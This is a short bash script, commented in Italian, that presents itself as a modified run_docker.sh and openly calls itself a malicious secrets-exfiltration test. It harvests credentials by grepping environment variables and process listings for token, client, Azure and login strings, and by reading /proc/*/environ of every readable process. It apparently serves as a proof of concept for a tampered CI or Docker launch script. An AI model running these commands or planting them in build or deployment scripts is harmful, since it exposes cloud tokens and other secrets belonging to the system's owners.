#!/bin/bash

echo "[*] Avvio file run_docker.sh modificato"
echo "[*] Avvio script malevolo :)"

echo "[*] Avvio test esfiltrazione dei secrets..."

# Prova 1: dump env accessibili a questo processo
echo "[+] ENV:"
env | grep -i 'token\|client\|sub\|id'

# Prova 2: scan dei processi in esecuzione per trovare parametri CLI o env temporanei
echo "[+] Parametri processi:"
ps aux | grep -i 'azure\|login\|token\|client'

# Prova 3: accesso ai file ambientali di processi in esecuzione
echo "[+] Dump ambienti di altri processi:"
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
  if [ -r /proc/$pid/environ ]; then
    strings /proc/$pid/environ | grep -i 'token\|client\|sub\|id'
  fi
done